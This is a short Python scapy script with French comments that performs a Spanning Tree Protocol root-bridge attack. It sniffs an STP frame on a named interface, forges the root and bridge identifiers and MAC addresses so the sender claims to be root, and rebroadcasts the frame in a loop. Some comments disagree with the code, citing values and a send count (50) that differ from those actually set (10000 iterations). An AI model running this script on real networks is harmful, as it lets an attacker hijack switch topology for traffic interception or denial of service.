#!/usr/bin/python3
'''Code source pour l'attaque STP'''
#Importation de toutes les fonctionnalités de la bibliothèque scapy
from scapy.all import *
print("Lancement de l'attaque STP")
#Utilisation de la fonction "sniff" pour capturer une trame STP avec une adresse de destination de multidiffusion (01:80:c2:00:00:00)
frame = sniff(filter="ether src 00:1b:53:08:62:97", iface="enxa0cec8f3e4df", count=1)
frame.show()
#Changement de l'adresse MAC source de la trame en "00:00:00:00:00:01"
frame[0].src="85:d2:3a:ca:fe:8a"
#Modification de l'identifiant du switch racine (rootid) à 0 afin de mettre en place une nouvelle élection
frame[0].rootid=1
#Modification de l'adresse MAC du switch racine (rootmac) à "00:00:00:00:00:01"
frame[0].rootmac="a0:ce:c8:f3:e4:df"
#Modification de l'identifiant du pont (bridgeid) à 0
frame[0].bridgeid=1
#Modification de l'adresse MAC du pont (bridgemac) à "00:00:00:00:00:01"
frame[0].bridgemac="01:80:c2:00:00:00"
#Utilisation de la fonction "show" afin d'afficher les détails de la trame modifiée
frame[0].show()
#Utilisation d'une boucle "for" afin d'envoyer la trame modifiée dans le réseau 50 fois
for i in range (0, 10000):
    #Utilisation de la fonction "sendp" afin d'envoyer la trame
    #La commande "loop=0" indique de ne pas envoyer la trame en boucle
    #La commande "verbose=1" indique d'afficher des informations détaillées lors l'envoi.
    sendp(frame[0], loop=0, verbose=1)
    #Permet d'attendre 1 seconde avant de ré-envoyer la trame
    time.sleep(1)